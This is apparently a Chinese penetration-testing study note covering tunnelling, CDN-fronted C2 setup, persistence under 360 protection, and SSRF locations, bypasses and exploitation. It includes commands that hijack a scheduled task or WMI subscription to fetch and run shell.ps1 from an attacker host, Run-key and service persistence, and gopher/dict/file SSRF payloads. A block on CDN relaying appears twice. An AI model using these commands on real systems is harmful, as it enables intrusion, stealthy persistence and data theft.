<p><strong>什么是 VPN？</strong> VPN（Virtual Private Network）是一种虚拟专用网络，它可以在公用网络上建立一个加密的、安全的通信通道。在渗透测试中，我们有时会利用 VPN 软件（如 OpenVPN）在跳板机上建立一个 VPN 服务，然后让目标内网机器连接到这个服务，从而将目标机器完全纳入我们的攻击网络，实现对内网的完全控制</p>
<p><strong>如何实现？</strong></p>
<ul>
<li><strong>OpenVPN</strong>: 这是最常见且开源的 VPN 软件。你可以在一台公网 VPS 上搭建 OpenVPN 服务器，然后将客户端配置上传到内网跳板机，在跳板机上运行客户端连接服务器。这样，你的本地机器就可以通过这个 VPN 通道直接访问内网</li>
</ul>
<hr>
<h3 id="如果-TCP-和-UDP-不出网怎么绕过"><a href="#如果-TCP-和-UDP-不出网怎么绕过" class="headerlink" title="如果 TCP 和 UDP 不出网怎么绕过"></a>如果 TCP 和 UDP 不出网怎么绕过</h3><p><strong>1. 利用 DNS 协议进行隧道传输</strong></p>
<p>DNS 协议是最常见的出网协议之一，很多防火墙为了保证正常的网络解析，都会放行 DNS 流量。因此，我们可以利用 DNS 请求和响应来传输数据</p>
<ul>
<li><strong>工作原理</strong>: 我们把需要传输的数据编码成 DNS 域名请求（通常是子域名），发送给一个可控的 DNS 服务器。我们的服务器收到请求后，会解析这些数据，并把响应数据编码在 DNS 回复包中，发回给目标机器</li>
<li><strong>常用工具</strong>:<ul>
<li><strong>dnscat2</strong>: 这是一个功能强大的 DNS 隧道工具，支持加密和交互式会话，可以建立一个类似 shell 的通道</li>
<li><strong>iodine</strong>: 另一个流行的 DNS 隧道工具，可以将 IPv4 流量封装在 DNS 请求中</li>
</ul>
</li>
</ul>
<p><strong>2. 利用 ICMP 协议进行隧道传输</strong></p>
<p>ICMP（互联网控制消息协议）主要用于网络诊断，例如 <code>ping</code> 命令就是基于 ICMP 协议。如果网络管理员没有禁用 ICMP，我们可以利用 ICMP 包来传输数据</p>
<ul>
<li><p><strong>工作原理</strong>: 将数据封装在 ICMP Echo 请求或回复的数据载荷中。目标机器发送带有数据的 ICMP 请求到我们的服务器，我们的服务器解析数据并发送 ICMP 回复包，以此实现双向通信</p>
</li>
<li><p><strong>常用工具</strong>:</p>
<ul>
<li><strong><code>icmpsh</code></strong>: 一个简单的 ICMP shell，可以在两台机器之间建立一个交互式命令行</li>
<li><strong><code>ptunnel</code></strong>: 一个 TCP over ICMP 的隧道工具，可以将 TCP 流量通过 ICMP 隧道传输</li>
</ul>
<hr>
</li>
</ul>
<h3 id="多级代理如何做一个-CDN-进行中转"><a href="#多级代理如何做一个-CDN-进行中转" class="headerlink" title="多级代理如何做一个 CDN 进行中转"></a>多级代理如何做一个 CDN 进行中转</h3><p><strong>步骤一：准备 C2 服务器</strong></p>
<p>首先，你需要一台公网服务器作为你的 C2 服务器</p>
<ol>
<li><strong>购买一台云服务器</strong>：选择一个知名云服务商，比如 AWS、Azure、Google Cloud 或 Linode</li>
<li><strong>配置 C2 框架</strong>：安装你的渗透测试框架，例如 <strong>Cobalt Strike</strong>、<strong>Metasploit</strong> 或 <strong>Sliver</strong></li>
<li><strong>配置监听器</strong>：在 C2 框架中设置一个 HTTP&#x2F;HTTPS 的监听器。<strong>确保监听的端口是 80 或 443</strong>，这是 CDN 默认支持的端口，也是最常见的 Web 流量端口</li>
</ol>
<p><strong>步骤二：配置 CDN 服务</strong></p>
<p>接下来，你需要配置一个 CDN 服务来指向你的 C2 服务器。这里我们以 Cloudflare 为例，因为它是最常用且免费的选项</p>
<ol>
<li><strong>注册域名</strong>：你需要一个自己的域名。可以是任何后缀，比如 <code>.com</code>、<code>.net</code> 或 <code>.xyz</code></li>
<li><strong>将域名解析到 Cloudflare</strong>：<ul>
<li>在域名注册商那里，将域名的 DNS 服务器修改为 Cloudflare 提供的 DNS 服务器</li>
<li>在 Cloudflare 中，添加你的域名</li>
</ul>
</li>
<li><strong>创建 DNS 记录</strong>：<ul>
<li>在 Cloudflare 的 DNS 设置页面，创建一个 <strong>A 记录</strong>，将你想要的子域名（例如 <code>cdn.yourdomain.com</code>）指向你的 <strong>C2 服务器的真实 IP 地址</strong></li>
<li><strong>关键步骤</strong>：确保这个记录的代理状态（Proxy status）设置为 <strong>“已代理”（Proxied）</strong>，即那个云朵图标是亮的。这是告诉 Cloudflare 将流量通过它的网络中转，而不是直接解析到你的 IP</li>
</ul>
</li>
<li><strong>配置 SSL&#x2F;TLS</strong>：<ul>
<li>在 Cloudflare 的 SSL&#x2F;TLS 设置页面，将模式设置为 <strong>“完全 (严格)”（Full (strict)）</strong>。这会确保从客户端到 Cloudflare 的流量是加密的，同时从 Cloudflare 到你的服务器的流量也是加密的</li>
<li>你需要在你的 C2 服务器上为你的域名安装一个有效的 SSL 证书。可以使用 Let’s Encrypt 免费生成</li>
</ul>
</li>
</ol>
<p><strong>步骤三：在目标机器上执行</strong></p>
<p>现在，你已经有了一个通过 CDN 中转的 HTTPS 流量通道</p>
<ol>
<li><strong>生成 payload</strong>：使用你的 C2 框架生成一个 payload，其回调地址（Callback URL）就是你刚才配置的 <strong>CDN 子域名</strong>（例如 <code>https://cdn.yourdomain.com/</code>）</li>
<li><strong>执行 payload</strong>：将这个 payload 部署到目标机器上并执行</li>
<li><strong>C2 通信</strong>：当 payload 在目标机器上运行时，它会向 <code>cdn.yourdomain.com</code> 发送 HTTPS 请求。这个请求首先会到达 Cloudflare 的边缘节点，Cloudflare 识别到这是一个代理流量，然后将它转发到你后台配置的 C2 服务器的真实 IP 地址。这样，C2 服务器就能与目标机器建立连接</li>
</ol>
<hr>
<h1 id="10-权限维持系列"><a href="#10-权限维持系列" class="headerlink" title="10- 权限维持系列"></a>10- 权限维持系列</h1><h3 id="多级代理如何做一个-CDN-进行中转-1"><a href="#多级代理如何做一个-CDN-进行中转-1" class="headerlink" title="多级代理如何做一个 CDN 进行中转"></a>多级代理如何做一个 CDN 进行中转</h3><p><strong>步骤一：准备 C2 服务器</strong></p>
<p>首先，你需要一台公网服务器作为你的 C2 服务器</p>
<ol>
<li><strong>购买一台云服务器</strong>：选择一个知名云服务商，比如 AWS、Azure、Google Cloud 或 Linode</li>
<li><strong>配置 C2 框架</strong>：安装你的渗透测试框架，例如 <strong>Cobalt Strike</strong>、<strong>Metasploit</strong> 或 <strong>Sliver</strong></li>
<li><strong>配置监听器</strong>：在 C2 框架中设置一个 HTTP&#x2F;HTTPS 的监听器。<strong>确保监听的端口是 80 或 443</strong>，这是 CDN 默认支持的端口，也是最常见的 Web 流量端口</li>
</ol>
<p><strong>步骤二：配置 CDN 服务</strong></p>
<p>接下来，你需要配置一个 CDN 服务来指向你的 C2 服务器。这里我们以 Cloudflare 为例，因为它是最常用且免费的选项</p>
<ol>
<li><strong>注册域名</strong>：你需要一个自己的域名。可以是任何后缀，比如 <code>.com</code>、<code>.net</code> 或 <code>.xyz</code></li>
<li><strong>将域名解析到 Cloudflare</strong>：<ul>
<li>在域名注册商那里，将域名的 DNS 服务器修改为 Cloudflare 提供的 DNS 服务器</li>
<li>在 Cloudflare 中，添加你的域名</li>
</ul>
</li>
<li><strong>创建 DNS 记录</strong>：<ul>
<li>在 Cloudflare 的 DNS 设置页面，创建一个 <strong>A 记录</strong>，将你想要的子域名（例如 <code>cdn.yourdomain.com</code>）指向你的 <strong>C2 服务器的真实 IP 地址</strong></li>
<li><strong>关键步骤</strong>：确保这个记录的代理状态（Proxy status）设置为 <strong>“已代理”（Proxied）</strong>，即那个云朵图标是亮的。这是告诉 Cloudflare 将流量通过它的网络中转，而不是直接解析到你的 IP</li>
</ul>
</li>
<li><strong>配置 SSL&#x2F;TLS</strong>：<ul>
<li>在 Cloudflare 的 SSL&#x2F;TLS 设置页面，将模式设置为 <strong>“完全 (严格)”（Full (strict)）</strong>。这会确保从客户端到 Cloudflare 的流量是加密的，同时从 Cloudflare 到你的服务器的流量也是加密的</li>
<li>你需要在你的 C2 服务器上为你的域名安装一个有效的 SSL 证书。可以使用 Let’s Encrypt 免费生成</li>
</ul>
</li>
</ol>
<p><strong>步骤三：在目标机器上执行</strong></p>
<p>现在，你已经有了一个通过 CDN 中转的 HTTPS 流量通道</p>
<ol>
<li><strong>生成 payload</strong>：使用你的 C2 框架生成一个 payload，其回调地址（Callback URL）就是你刚才配置的 <strong>CDN 子域名</strong>（例如 <code>https://cdn.yourdomain.com/</code>）</li>
<li><strong>执行 payload</strong>：将这个 payload 部署到目标机器上并执行</li>
<li><strong>C2 通信</strong>：当 payload 在目标机器上运行时，它会向 <code>cdn.yourdomain.com</code> 发送 HTTPS 请求。这个请求首先会到达 Cloudflare 的边缘节点，Cloudflare 识别到这是一个代理流量，然后将它转发到你后台配置的 C2 服务器的真实 IP 地址。这样，C2 服务器就能与目标机器建立连接</li>
</ol>
<hr>
<h3 id="360-开启了晶核模式，怎么去尝试权限维持"><a href="#360-开启了晶核模式，怎么去尝试权限维持" class="headerlink" title="360 开启了晶核模式，怎么去尝试权限维持"></a>360 开启了晶核模式，怎么去尝试权限维持</h3><p><strong>1. 放弃传统方法，转向无文件和内存驻留</strong></p>
<p>在晶核模式下，任何涉及到文件落地、注册表写入、服务创建的传统权限维持方法都极有可能被拦截。因此，我们的核心思想是：<strong>不落地、不留痕、内存驻留</strong></p>
<ul>
<li><strong>无文件攻击</strong>：避免将任何可执行文件（<code>.exe</code>、<code>.dll</code>）写入磁盘。所有的恶意代码都应该通过 PowerShell、C# 或其他脚本语言在内存中运行</li>
<li><strong>内存驻留</strong>：将恶意代码注入到合法的、白名单内的进程中，如 <code>svchost.exe</code>、<code>explorer.exe</code> 等。这样，恶意代码就可以利用合法进程的信任度来绕过安全软件的监控</li>
<li><strong>使用 PowerShell 或 C#</strong>：利用 PowerShell 的反射式加载（Reflective Loading）技术，可以直接在内存中执行 .NET 程序集。360 晶核模式对 PowerShell 脚本的监控非常严格，因此需要使用混淆、加密等技术来绕过其行为分析</li>
</ul>
<p><strong>2. 利用系统自带的合法进程和功能</strong></p>
<p>晶核模式的核心是识别恶意行为，而不是简单地拦截所有操作。因此，我们可以利用那些系统自带的、360 无法或不敢拦截的合法进程来执行我们的恶意代码</p>
<ul>
<li><strong>利用 <code>COM</code> 或 <code>WMI</code></strong>：Windows Management Instrumentation (WMI) 和 Component Object Model (COM) 是系统核心组件，它们允许本地和远程执行代码。许多安全软件无法直接拦截这些操作，因为这可能会导致系统功能异常<ul>
<li>你可以通过 <code>WMI</code> 在目标机器上<strong>远程执行代码</strong>，而无需将可执行文件写入磁盘。这种方法非常隐蔽，因为 <code>WMI</code> 流量是合法的</li>
<li>通过 <code>COM</code> 组件，你可以利用那些具有特权的 COM 对象，执行一些平时受限的操作</li>
</ul>
</li>
<li><strong>利用计划任务（Scheduled Tasks）</strong>：虽然创建新的计划任务可能会被晶核模式拦截，但你可以尝试修改已有的、合法的计划任务<ul>
<li><strong>命令</strong>：<code>schtasks</code></li>
<li><strong>思路</strong>：找到一个不显眼的、定期执行的系统任务，然后修改它的执行命令，让它执行你的无文件后门例如，你可以让它定时执行一个 PowerShell 脚本，该脚本从网络上下载并执行恶意代码</li>
</ul>
</li>
<li><strong>利用 <code>runas</code> 或其他 Windows API</strong>：如果可以拿到高权限，可以尝试利用 <code>runas</code> 或类似的 API 来启动一个拥有更高权限的新进程，然后将恶意代码注入到新进程中</li>
</ul>
<p><strong>3. 持久化技巧</strong></p>
<p>在权限维持方面，可以考虑以下几种高级技巧：</p>
<ul>
<li><p><strong>DLL 劫持</strong>：找到一个启动时会加载 DLL 的合法程序，并将一个恶意的 DLL 文件放置在它会寻找的路径中。当程序启动时，它会加载你的恶意 DLL，从而执行你的代码</p>
<ul>
<li><strong>晶核模式的挑战</strong>：晶核模式通常会阻止未签名的 DLL 加载到敏感进程中，因此你需要找到一个没有签名检查的合法程序，或者你的 DLL 需要经过特殊处理</li>
</ul>
</li>
<li><p><strong>COM 劫持</strong>：攻击者可以修改 Windows 注册表中的 COM 组件路径，将合法的 COM 组件替换为恶意的。当应用程序调用这个组件时，就会执行恶意代码</p>
<ul>
<li><strong>晶核模式的挑战</strong>：晶核模式会对注册表中的关键键值进行监控，因此这种方法需要非常小心，或者找到一个未被监控的注册表键</li>
</ul>
</li>
<li><p><strong>利用驱动程序</strong>：这是最高级的权限维持方法，但难度也最大。你可以尝试加载一个恶意的内核驱动程序。内核驱动拥有最高的权限，可以绕过几乎所有的用户态安全防护</p>
<ul>
<li><strong>晶核模式的挑战</strong>：360 晶核模式的核心就是内核级防护，它会严格检查所有加载的驱动程序。如果你没有一个经过微软签名的驱动程序，很难成功</li>
</ul>
<hr>
</li>
</ul>
<h3 id="计划任务被拦截了怎么办"><a href="#计划任务被拦截了怎么办" class="headerlink" title="计划任务被拦截了怎么办"></a>计划任务被拦截了怎么办</h3><p><strong>1. 放弃创建，寻找修改或利用已有的计划任务</strong></p>
<p>安全软件通常只监控<strong>创建新任务</strong>的行为，但可能不会对<strong>修改已有任务</strong>的行为进行强拦截，尤其是那些系统或合法程序创建的计划任务</p>
<ul>
<li><p><strong>攻击原理</strong>：找到一个不显眼的、定期执行的、且权限足够高的系统任务，然后修改它的执行命令，让它在执行原有任务的同时，也执行你的恶意代码</p>
</li>
<li><p><strong>操作步骤</strong>：</p>
<ol>
<li><p><strong>信息收集</strong>：首先，使用 <code>schtasks /query /fo list /v</code> 命令来列出所有已有的计划任务。你需要关注以下几点：</p>
<ul>
<li><strong>任务名称</strong>：寻找那些看起来合法、不引人注意的任务，例如与系统更新、日志清理相关的任务</li>
<li><strong>执行账户</strong>：寻找那些以 <code>SYSTEM</code> 或 <code>Administrator</code> 权限运行的任务</li>
<li><strong>触发器</strong>：了解任务的触发频率（例如每天、每周）</li>
</ul>
</li>
<li><p><strong>修改任务</strong>：使用 <code>schtasks /change</code> 命令来修改任务的执行命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 示例：修改一个名为“Microsoft\Windows\Defrag\ScheduledDefrag”的合法任务</span></span><br><span class="line">schtasks /change /tn <span class="string">&quot;Microsoft\Windows\Defrag\ScheduledDefrag&quot;</span> /tr <span class="string">&quot;powershell.exe -c \&quot;</span><span class="built_in">iwr</span> http://&lt;攻击机IP&gt;/shell.ps1 <span class="literal">-OutFile</span> C:\temp\shell.ps1; <span class="built_in">Start-Process</span> C:\temp\shell.ps1\<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li><strong>优点</strong>：这种方法利用了合法任务的“信任”，行为更加隐蔽，不容易被安全软件识别为恶意创建行为</li>
</ul>
</li>
</ul>
<p><strong>2. 利用启动项或服务进行权限维持</strong></p>
<p>如果计划任务的路走不通，启动项和服务是另一个值得尝试的切入点</p>
<ul>
<li><p><strong>利用注册表启动项</strong>：许多应用程序都通过注册表键值来实现开机自启动。安全软件可能会监控这些键值的创建，但你可以尝试修改一些不那么敏感的键值</p>
<ul>
<li><p><strong>常见路径</strong>：</p>
<ul>
<li><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
</ul>
</li>
<li><p><strong>操作步骤</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在注册表Run键中添加一个启动项</span></span><br><span class="line">reg add <span class="string">&quot;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v <span class="string">&quot;MyUpdater&quot;</span> /t REG_SZ /d <span class="string">&quot;C:\Users\Public\payload.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>缺点</strong>：这种方法非常常见，很容易被安全软件拦截。你需要使用更隐蔽的键值或利用无文件方式</p>
</li>
</ul>
</li>
<li><p><strong>利用服务</strong>：Windows 服务可以以高权限运行，并且可以配置为开机自启动</p>
<ul>
<li><p><strong>操作步骤</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个新的服务</span></span><br><span class="line"><span class="built_in">sc</span> create MyService binPath= <span class="string">&quot;C:\Users\Public\payload.exe&quot;</span> <span class="built_in">start</span>= auto</span><br><span class="line"><span class="comment"># 启动服务</span></span><br><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> MyService</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>缺点</strong>：创建新服务同样是一个非常敏感的操作，几乎所有的安全软件都会进行拦截</p>
</li>
</ul>
</li>
</ul>
<p><strong>3. 使用无文件和内存驻留技术</strong></p>
<p>这是在高级防护环境下最有效的权限维持方法，因为它完全绕过了文件系统和注册表的监控</p>
<ul>
<li><p><strong>DLL 劫持</strong>：找到一个经常被合法程序调用的、但路径可写的 DLL 文件，将你的恶意代码注入到这个 DLL 中</p>
<ul>
<li><strong>操作步骤</strong>：<ol>
<li>找到一个合法程序（例如 <code>c:\Program Files\Google\Chrome\Application\chrome.exe</code>）启动时会去加载的 DLL</li>
<li>将你自己的恶意 DLL 文件命名为相同的名字，并放置在程序会优先寻找的路径中。</li>
<li>当用户启动这个程序时，你的恶意 DLL 就会被加载并执行，从而实现权限维持</li>
</ol>
</li>
<li><strong>优点</strong>：这种方法非常隐蔽，因为执行的是合法程序，绕过了许多行为监控</li>
</ul>
</li>
<li><p><strong>WMI&#x2F;COM 持久化</strong>：利用 Windows Management Instrumentation (WMI) 或 Component Object Model (COM) 实现持久化</p>
<ul>
<li><p><strong>原理</strong>：你可以创建一个 WMI 事件订阅，当某个特定事件发生时（例如系统启动），自动触发执行你的恶意代码</p>
</li>
<li><p><strong>操作步骤</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个WMI事件过滤器，当系统启动时触发</span></span><br><span class="line"><span class="variable">$filter</span> = <span class="built_in">New-CimInstance</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-ClassName</span> __EventFilter <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;QueryLanguage=<span class="string">&quot;WQL&quot;</span>; Query=<span class="string">&quot;SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA &#x27;Win32_Process&#x27; AND TargetInstance.Name = &#x27;notepad.exe&#x27;&quot;</span>&#125; <span class="literal">-ErrorAction</span> Stop</span><br><span class="line"><span class="comment"># 创建一个WMI事件消费者，执行你的恶意代码</span></span><br><span class="line"><span class="variable">$consumer</span> = <span class="built_in">New-CimInstance</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-ClassName</span> CommandLineEventConsumer <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;myconsumer&quot;</span>; CommandLineTemplate=<span class="string">&quot;powershell.exe -c &#x27;iwr http://&lt;攻击机IP&gt;/shell.ps1|iex&#x27;&quot;</span>&#125; <span class="literal">-ErrorAction</span> Stop</span><br><span class="line"><span class="comment"># 将过滤器和消费者绑定</span></span><br><span class="line"><span class="variable">$binding</span> = <span class="built_in">New-CimInstance</span> <span class="literal">-Namespace</span> root/subscription <span class="literal">-ClassName</span> __FilterToConsumerBinding <span class="literal">-Property</span> <span class="selector-tag">@</span>&#123;<span class="keyword">Filter</span>=<span class="variable">$filter</span>; Consumer=<span class="variable">$consumer</span>&#125; <span class="literal">-ErrorAction</span> Stop</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>优点</strong>：这是最高级的无文件持久化技术，非常难以被检测</p>
</li>
</ul>
</li>
</ul>
<h1 id="11-SSRF-系列"><a href="#11-SSRF-系列" class="headerlink" title="11- SSRF 系列"></a>11- SSRF 系列</h1><h3 id="SSRF-漏洞存在位置"><a href="#SSRF-漏洞存在位置" class="headerlink" title="SSRF 漏洞存在位置"></a>SSRF 漏洞存在位置</h3><p><strong>1. URL地址加载资源</strong></p>
<p>这是 SSRF 漏洞最经典的藏身之处。当一个网站需要通过 URL 地址从其他服务器获取图片、文件或音频等资源时，就可能存在 SSRF</p>
<ul>
<li><strong>头像&#x2F;图片上传</strong>：很多社交平台或电商网站允许用户通过提供图片 URL 来上传头像或商品图片<ul>
<li><strong>案例</strong>：在某电商平台的商品图片上传接口，我发现一个名为 <code>image_url</code> 的参数。我将其值从一个合法的图片链接改为内网地址，如<code>http://192.168.1.1</code>，服务器返回了连接超时的错误。当我改为<code>http://127.0.0.1:80</code> 时，却返回了“HTTP 请求无效”的错误。通过这些差异，我判断 <code>127.0.0.1</code> 的 80 端口是开放的，从而证实了 SSRF 漏洞的存在</li>
</ul>
</li>
<li><strong>文章或图片收藏</strong>：当用户分享或收藏一个网页时，服务器会去抓取页面标题、描述、缩略图等信息<ul>
<li><strong>案例</strong>：在一个内容管理系统（CMS）中，我测试了“分享文章”功能。当我输入一个 URL 时，系统会生成一个预览。我将 <code>url</code> 参数的值从外网地址改为了 <code>http://localhost/</code>，结果系统成功抓取并展示了本地服务器的登录页面。这证明了服务器执行了请求，并且没有对 <code>localhost</code> 进行过滤</li>
</ul>
</li>
</ul>
<p><strong>2. URL协议解析不当与转码服务</strong></p>
<p>开发者在处理 URL 时，往往只过滤了 <code>http://</code> 和 <code>https://</code>，却忘记了其他协议，或者没有对 URL 重定向进行二次校验</p>
<ul>
<li><strong>转码服务</strong>：一些在线视频或音频转码服务，需要用户提供一个 URL，服务器会去下载并进行格式转换<ul>
<li><strong>案例</strong>：一个视频转码服务的 <code>video_url</code> 参数可以被利用。我尝试将 <code>http://</code> 协议替换为 <code>file://</code>，并输入 <code>file:///etc/passwd</code>。服务器返回了 <code>/etc/passwd</code> 文件的内容，这表明服务器不仅存在 SSRF，还存在**本地文件读取（LFI）**漏洞</li>
</ul>
</li>
<li><strong>在线翻译&#x2F;API调用</strong>：许多翻译服务需要通过 API 去获取内容，如果 API 的 URL 可控，就可能存在 SSRF<ul>
<li><strong>案例</strong>：一个未公开的 API 接口用于调用 URL 服务，我尝试用 <code>gopher://</code> 协议去攻击内网的 Redis 服务。我构造了 Gopher URL，并将其作为 API 参数发送，最终成功在目标服务器上执行了 Redis 命令，实现了代码执行</li>
</ul>
</li>
</ul>
<p><strong>3. 第三方服务与Webhooks</strong></p>
<p>现代应用经常需要与其他服务集成，例如支付接口、云服务 API 等。这些集成点经常需要通过 URL 进行通信</p>
<ul>
<li><p><strong>Webhooks</strong>：许多 SaaS 产品支持 Webhooks，当特定事件发生时，它会向用户指定的 URL 发送 HTTP 请求</p>
<ul>
<li><strong>案例</strong>：在一个 Git 仓库管理平台，我发现它允许自定义 Webhook URL。我将 Webhook URL 设置为内网的 <code>http://192.168.10.20/</code>。当有代码提交时，我通过检查网络流量，证实了服务器确实去请求了这个内部地址，从而证明了 SSRF 漏洞的存在</li>
</ul>
</li>
<li><p><strong>云服务API</strong>：在云环境中，元数据服务通常通过一个固定的内网 IP 提供敏感信息</p>
<ul>
<li><strong>案例</strong>：在一个运行在 AWS 的网站上，我利用 SSRF 漏洞让服务器请求 AWS 的元数据服务地址<code>http://169.254.169.254/latest/meta-data/</code>。服务器成功返回了一个目录列表，这表明我能够访问这个特殊的内网服务，并可以进一步获取 IAM 凭证来控制整个云实例</li>
</ul>
<hr>
<h3 id="SSRF-漏洞绕过方法"><a href="#SSRF-漏洞绕过方法" class="headerlink" title="SSRF 漏洞绕过方法"></a>SSRF 漏洞绕过方法</h3></li>
</ul>
<p><strong>1. IP 地址绕过</strong></p>
<p>服务器为了防止内网探测，通常会限制请求的目标IP，比如禁止访问私有IP地址（10.0.0.0&#x2F;8, 172.16.0.0&#x2F;12, 192.168.0.0&#x2F;16, 127.0.0.1）。我们可以尝试一些技巧来绕过这些限制</p>
<ul>
<li><strong>十进制、八进制、十六进制等进制转换：</strong><ul>
<li><strong>十进制：</strong> <code>http://127.0.0.1</code> 可以转换为 <code>http://2130706433</code></li>
<li><strong>八进制：</strong> <code>http://127.0.0.1</code> 可以转换为 <code>http://0177.0.0.1</code> 或 <code>http://017700000001</code></li>
<li><strong>十六进制：</strong> <code>http://127.0.0.1</code> 可以转换为 <code>http://0x7f000001</code></li>
<li><strong>混合进制：</strong> 例如 <code>http://0x7f.0.0.1</code></li>
<li><strong>域名解析：</strong> <code>localhost</code> 可以解析为 <code>127.0.0.1</code></li>
<li><strong>不完整 IP：</strong> 某些系统会把 <code>127.1</code> 当作 <code>127.0.0.1</code> 处理</li>
</ul>
</li>
<li><strong>短地址服务或域名重定向：</strong><ul>
<li>攻击者可以利用短地址服务（如 bit.ly）或自己搭建一个网站，设置 302&#x2F;307 重定向，将请求从白名单域名重定向到内网地址。例如，设置一个 <code>http://trusted.com/redirect</code>，当服务器请求此地址时，会自动跳转到 <code>http://192.168.1.1</code></li>
<li>这种方法常用于目标服务器只允许访问特定白名单域名的情况</li>
</ul>
</li>
<li><strong>利用 IPV6 地址绕过：</strong><ul>
<li>如果目标系统没有对 IPv6 地址进行过滤，那么 <code>::1</code> 就可以指向 <code>127.0.0.1</code></li>
</ul>
</li>
<li><strong>利用 <code>xip.io</code> 或类似服务：</strong><ul>
<li><code>xip.io</code> 是一个将 IP 地址嵌入域名的服务。例如，<code>10.0.0.1.xip.io</code> 会解析为 <code>10.0.0.1</code>。如果服务器只限制了 IP，但未限制域名解析，这会是有效的绕过方法</li>
</ul>
</li>
</ul>
<p><strong>2. 协议绕过</strong></p>
<p>除了 HTTP&#x2F;HTTPS 协议，许多库还支持其他协议。如果服务器没有对这些协议进行过滤，我们可以利用它们来访问服务器的本地文件或服务</p>
<ul>
<li><strong><code>file://</code> 协议：</strong><ul>
<li><code>file:///etc/passwd</code> 可以读取 <code>/etc/passwd</code> 文件</li>
<li><code>file:///C:/Windows/win.ini</code> 可以读取 Windows 系统的 <code>win.ini</code> 文件</li>
<li><strong><code>dict://</code> 协议：</strong><ul>
<li><code>dict://127.0.0.1:6379/info</code> 可以查询 Redis 服务的信息</li>
<li><code>dict://127.0.0.1:6379/config:set:dbfilename:evil.php</code> 可以用于写入恶意文件</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>gopher://</code> 协议：</strong><ul>
<li>这是最强大的协议之一，可以发送任意 TCP 请求。攻击者可以利用它来攻击内网的各种服务，如 MySQL、Redis、FastCGI 等</li>
<li>例如，攻击 Redis 服务：<code>gopher://127.0.0.1:6379/_*2%0D%0A$4%0D%0Ainfo%0D%0A</code></li>
</ul>
</li>
<li><strong><code>ftp://</code> 协议：</strong><ul>
<li>可以利用 FTP 协议在某些情况下进行端口扫描，或者发送自定义命令</li>
</ul>
</li>
</ul>
<p><strong>3. URL 解析绕过</strong></p>
<p>不同的URL解析器（如 PHP、Python、CURL 等）对 URL 的解析规则可能存在差异。利用这种差异，可以绕过基于正则表达式的过滤</p>
<ul>
<li><strong>利用特殊字符：</strong><ul>
<li><code>@</code> 符号：<code>http://example.com@127.0.0.1</code>，在一些解析器中，会忽略 <code>@</code> 前的内容，导致请求发往 <code>127.0.0.1</code></li>
<li><code>#</code> 符号：<code>http://127.0.0.1#example.com</code>， <code>#</code> 后面的内容通常被认为是片段标识符，会被忽略，从而请求 <code>127.0.0.1</code></li>
</ul>
</li>
<li><strong>利用 URL 编码：</strong><ul>
<li>对 IP 地址进行URL编码，例如 <code>127.0.0.1</code> 编码为 <code>%31%32%37%2E%30%2E%30%2E%31</code></li>
<li>对 <code>.</code> 进行 URL 编码，例如 <code>http://127%2E0%2E0%2E1</code></li>
</ul>
</li>
<li><strong>利用 DNS Rebinding：</strong><ul>
<li><p>这是高级且难以防范的技巧。攻击者控制一个域名，该域名在短时间内第一次解析为一个非内网 IP（通过白名单检查），第二次解析为内网 IP</p>
</li>
<li><p><strong>步骤：</strong></p>
<ol>
<li>攻击者设置一个恶意域名 <code>evil.com</code>，其 DNS 记录 TTL（生存时间）设置为很低</li>
<li>第一次 DNS 解析，<code>evil.com</code> 解析为一个公网 IP，服务器通过白名单检查</li>
<li>服务器发起请求，但由于请求需要时间，在第二次DNS解析时，攻击者将 <code>evil.com</code> 的 DNS 记录修改为 <code>127.0.0.1</code></li>
<li>服务器再次请求 <code>evil.com</code> 时，会请求到 <code>127.0.0.1</code>，从而绕过过滤</li>
</ol>
<hr>
<h3 id="SSRF-漏洞利用方式"><a href="#SSRF-漏洞利用方式" class="headerlink" title="SSRF 漏洞利用方式"></a>SSRF 漏洞利用方式</h3></li>
</ul>
</li>
</ul>
<p><strong>1. 端口扫描</strong></p>
<p>这是最基础也最常见的利用方式。通过控制服务器向内网 IP 的不同端口发起请求，并根据响应时间、响应内容或 HTTP 状态码来判断端口是否开放</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li><strong>GET 请求：</strong> <code>http://192.168.1.1:22</code></li>
<li><strong>响应判断：</strong> 如果端口开放，通常会有 HTTP 响应；如果端口关闭或服务不存在，请求会超时或返回连接失败。通过脚本自动化这个过程，可以快速绘制出内网的端口图</li>
</ul>
</li>
</ul>
<p><strong>2. 访问内网应用</strong></p>
<p>如果服务器能够访问内网，攻击者就可以通过SSRF漏洞来探测和攻击那些通常无法从外部网络访问的应用</p>
<ul>
<li><strong>利用方式：</strong><ul>
<li><strong>访问管理后台：</strong> 很多公司的内部管理系统、OA、数据库管理工具等都在内网运行。攻击者可以通过SSRF 漏洞直接访问这些后台，如果存在弱口令，就可能直接接管系统</li>
